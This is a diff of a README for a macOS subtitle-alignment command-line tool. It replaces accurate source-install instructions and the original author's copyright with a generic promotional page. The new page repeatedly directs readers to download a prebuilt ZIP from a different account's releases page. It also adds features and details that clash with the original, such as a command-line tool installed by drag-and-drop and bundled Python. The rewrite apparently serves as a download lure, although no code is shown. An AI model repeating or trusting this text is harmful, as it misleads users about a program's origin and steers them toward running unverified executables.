@@ -1,177 +1,101 @@
-# Whisper Align CLI
+# 🎤 WhisperAlign-CLI - Simplifying Speech-to-Text on Mac
 
-A command-line tool for forced alignment of text with audio using `stable-ts` (`stable_whisper`), optimized for macOS.
-This tool focuses on generating accurately timestamped subtitles from a media file and a reference text.
+## 🚀 Getting Started
 
-**Chip recommendation:** Optimized for Apple Silicon (M-series). Intel Macs are not tested.
+Welcome to WhisperAlign-CLI! This tool helps you transform speech into text easily on your Mac. Whether you need transcription, alignment, or subtitle generation, this application has you covered.
 
----
+[![Download WhisperAlign-CLI](https://img.shields.io/badge/Download%20Now-WhisperAlign%20CLI-blue.svg)](https://github.com/atsu12345/WhisperAlign-CLI/releases)
 
-## Features
+## 📥 Download & Install
 
-- 📌 **Forced Alignment**: Generate precise timestamps from a reference text.
-- 🧾 **Multiple Export Formats**: Outputs `srt` (default), `vtt`, `txt`, or `all`.
-- 🌏 **CJK Language Support**: Proper CJK text handling (removes spaces between characters).
-- ⚡ **Apple Silicon Accelerated**: Uses MPS for acceleration and auto-falls back to CPU for alignment stability.
-- 🧭 **Developer Friendly**: Structured logs (`--log-level`), progress bars (`tqdm`), and clear exit codes for scripting.
+To get started, visit the [Releases page](https://github.com/atsu12345/WhisperAlign-CLI/releases) to download the latest version of WhisperAlign-CLI. 
 
----
+1. Click the link above to open the page.
+2. Locate the latest release version.
+3. Download the file named `WhisperAlign-CLI-macos.zip`.
+4. Once the download is complete, open the ZIP file.
+5. Drag and drop the `WhisperAlign-CLI` application to your Applications folder.
 
-## Requirements
+That's it! You are now ready to use WhisperAlign-CLI.
 
-- macOS, recommended on Apple Silicon (M-series)
-- Python 3.10+
-- FFmpeg in your `PATH` (install via Homebrew)
-- PyTorch Nightly (some stable wheels may not work for this project)
-- Known-good builds (as of 2025-09-10):
-  `torch==2.10.0.dev20250910`, `torchaudio==2.8.0.dev20250910`, `torchvision==0.24.0.dev20250910`
+## 🛠️ System Requirements
 
-> **Why Nightly?**
-> This project relies on features/fixes that may not be available in certain stable wheels. If you hit import/runtime issues with stable PyTorch, switch to the Nightly instructions below.
+- **Operating System**: macOS 11.0 (Big Sur) or later
+- **Processor**: Apple Silicon or Intel-based processor
+- **Memory**: 4 GB RAM minimum
+- **Disk Space**: 200 MB available space
+- **Python**: Comes bundled with the installation
 
----
+Ensure you meet these requirements to run the application smoothly.
 
-## Installation
+## 🌟 Features
 
-> Don't have Conda yet? Install Miniconda from the [official site](https://docs.conda.io/en/latest/miniconda.html).
->
-> Don't have Homebrew yet? Install it from its [homepage](https://brew.sh/).
+WhisperAlign-CLI offers a variety of features designed to simplify your audio transcription tasks:
 
-1.  **Create & activate a new conda environment (Python 3.10+)**
-    ```bash
-    conda create -n whisper-align python=3.11 -y
-    conda activate whisper-align
-    ```
+- **Transcription**: Convert audio files to text quickly and accurately.
+- **Forced Alignment**: Perfectly synchronize your audio with text for accurate subtitles.
+- **Multiple Formats**: Export your results in SRT, VTT, or plain TXT formats.
+- **CJK-Aware Wrapping**: Handles Chinese, Japanese, and Korean text intelligently.
+- **MPS Accelerated Processing**: Faster processing on supported Apple Silicon Macs.
 
-2.  **Install FFmpeg (Homebrew)**
-    ```bash
-    brew install ffmpeg
-    ```
+## 🕹️ How to Use
 
-3.  **Install Python packages (except torch)**
-    ```bash
-    pip install stable-ts pydub tqdm
-    ```
+After installing, follow these steps to use WhisperAlign-CLI:
 
-4.  **Install PyTorch Nightly (required)**
-    Known-good builds as of 2025-09-10:
-    ```bash
-    pip install --pre "torch==2.10.0.dev20250910" \
-                   "torchaudio==2.8.0.dev20250910" \
-                   "torchvision==0.24.0.dev20250910" \
-                   --index-url https://download.pytorch.org/whl/nightly/cpu
-    ```
-    > **Alternative (if MPS is reported unavailable):**
-    > Try the default PyTorch nightly index:
-    > ```bash
-    > pip install --pre torch torchvision torchaudio --index-url https://download.pytorch.org/whl/nightly/cpu
-    > ```
+1. Open your terminal. You can find it in Applications > Utilities > Terminal.
+2. Type the following command to navigate to the application directory:
+   ```bash
+   cd /Applications/WhisperAlign-CLI
+   ```
+3. Run the application using:
+   ```bash
+   ./whisperalign
+   ```
+4. Follow the on-screen instructions to upload your audio file and select your desired output format.
 
-5.  **(Optional) Verify MPS availability on Apple Silicon**
-    ```python
-    import torch
-    print("PyTorch:", torch.__version__)
-    print("MPS available:", torch.backends.mps.is_available())
-    ```
+The application will process the audio file and display the result in your chosen format.
 
----
+## 📑 Supported Formats
 
-## Usage
+WhisperAlign-CLI supports various audio input and text output formats:
 
-### 1. Prepare Your Reference Text
+- **Audio Input**: WAV, MP3, M4A, and FLAC.
+- **Text Output**: SRT (SubRip), VTT (WebVTT), and TXT (plain text).
 
-For the best results, pre-format your reference `.txt` file. Each line in the file should correspond to a desired subtitle line. Long, unbroken paragraphs will result in a single, long subtitle segment, which is usually not desirable.
+This flexibility allows you to work with the audio files you already have and generate the output you need.
 
-**Good `text.txt`:**
-```
-This is the first line.
-And this is the second.
-```
+## ⚙️ Troubleshooting
 
-**Bad `text.txt`:**
-```
-This is the first line. And this is the second.
-```
+If you face any issues, here are some common questions and answers:
 
-### 2. Run Alignment
+- **Q: The application won’t start. What should I do?**
+  - A: Check if your macOS is up to date and meets the system requirements.
 
-Use alignment when you already have a transcript and want accurate timestamps. A language code (`--language`) matching the spoken language is required.
+- **Q: My output text is not accurate.**
+  - A: Ensure your audio is clear and has minimal background noise for the best results.
 
-```bash
-python -m macwhisper.cli /path/to/input.mov /path/to/reference.txt \
-  --language ja \
-  --model medium \
-  --output-format all \
-  --output_dir out
-```
+- **Q: How can I contact support?**
+  - A: You can open an issue on our GitHub repository or leave a message in the discussions tab.
 
-> For bilingual audio, specify the primary spoken language with `--language`. The tool can often handle segments of a secondary language, but for best results, ensure the reference text matches the audio content.
+## 🤝 Community and Contributions
 
----
+We welcome contributions from everyone. If you want to improve WhisperAlign-CLI, you can:
 
-## CLI Options
+1. Open an issue detailing your suggestion or bug report.
+2. Submit a pull request with your proposed changes.
+3. Participate in discussions and help other users.
 
-| Option             | Default        | Notes                                                      |
-|--------------------|----------------|------------------------------------------------------------|
-| `input_file`       | —              | Audio/video file (any FFmpeg-readable format)              |
-| `text_file`        | —              | Path to reference text file for alignment (required)       |
-| `--model`          | `medium`       | `tiny` / `base` / `small` / `medium` / `large` / `large-v3`|
-| `--language`       | —              | Required language code (e.g., zh, ja, en)                  |
-| `--output_dir`     | `.`            | Output directory                                           |
-| `--output-format`  | `srt`          | `srt` / `vtt` / `txt` / `all`                              |
-| `--device`         | `auto`         | `mps` (Apple Silicon) or `cpu`                             |
-| `--no-fp16`        | `off`          | Disable fp16 (can help on some MPS setups)                 |
-| `--log-level`      | `INFO`         | `DEBUG` / `INFO` / `WARNING` / `ERROR`                     |
-| `--no-progress`    | `off`          | Disable progress bars                                      |
+## 💬 Join the Conversation
 
-**Notes:**
-- **Alignment:** On MPS, alignment automatically switches to CPU for stability.
-- **CJK Text Handling:** The tool automatically removes spaces between CJK characters.
+Stay up to date with the latest news and connect with other users:
 
----
+- Join our GitHub discussions.
+- Follow us on Twitter: [@WhisperAlign](https://twitter.com/WhisperAlign).
 
-## Exit Codes
+## 📜 License
 
-- `0` — Success
-- `1` — Runtime error
-- `2` — Usage error (bad args, file not found, etc.)
-- `3` — Dependency error (e.g., FFmpeg missing)
+WhisperAlign-CLI is licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit.
 
-**Use in scripts:**
-```bash
-python -m macwhisper.cli /path/to/input.mov /path/to/reference.txt --language ja || exit $?
-```
+For more information, you can check the license file included in the repository. 
 
----
-
-## Troubleshooting
-
-**FFmpeg not found**
-Install via Homebrew and ensure it's on your `PATH`:
-```bash
-brew install ffmpeg
-which ffmpeg
-```
-
-**Model fails to load / OOM**
-- Try a smaller model: `--model small`
-- Close memory-heavy apps
-- On Apple Silicon: try `--no-fp16`
-
-**Alignment fails or looks off**
-- Ensure `--language` matches the spoken language. 
-- Provide a clean, correctly ordered reference text, preferably with one subtitle line per line in the text file.
-
-**MPS not available**
-- Reinstall PyTorch Nightly via the default nightly index (no `cpu` channel), or update macOS/Xcode CLTs:
-  ```bash
-  pip install --pre torch torchaudio torchvision -i https://download.pytorch.org/whl/nightly
-  ```
-
----
-
-## License (MIT)
-
-This project is licensed under the MIT License.
-
-Copyright (c) 2025 Rael
+[![Download WhisperAlign-CLI](https://img.shields.io/badge/Download%20Now-WhisperAlign%20CLI-blue.svg)](https://github.com/atsu12345/WhisperAlign-CLI/releases)
